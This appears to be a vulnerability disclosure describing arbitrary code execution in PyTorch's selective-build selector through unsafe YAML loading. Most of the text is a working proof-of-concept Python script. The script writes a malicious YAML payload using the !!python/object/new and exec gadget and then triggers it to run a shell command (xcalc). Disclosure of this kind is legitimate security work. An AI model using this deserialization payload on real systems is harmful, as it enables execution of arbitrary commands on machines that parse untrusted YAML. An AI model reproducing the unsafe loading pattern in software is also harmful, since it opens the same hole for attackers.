# Description
**Arbitrary Code Excecution** in pytorch/tools/codegen/selective_build/selector.py.
Tensors and Dynamic neural networks in Python with strong GPU acceleration.
# Technical Description
This package was vulnerable to Arbitrary code execution due to a use of a known vulnerable function **load()** in **yaml**
# Exploit code
**Python File**
```python
import os
os.system('git clone https://github.com/pytorch/pytorch.git')
os.chdir('pytorch/')
from tools.codegen.selective_build import selector
exploit = """!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('exploit.yml','w+').write(exploit)
selector.SelectiveBuilder.from_yaml_path('exploit.yml')
os.system('rm exploit.yml')
```
# POC
* Run the exploit code 

![](https://cdn.discordapp.com/attachments/749019614352244777/786332580811243550/Screenshot_from_2020-12-10_01-55-24.png)
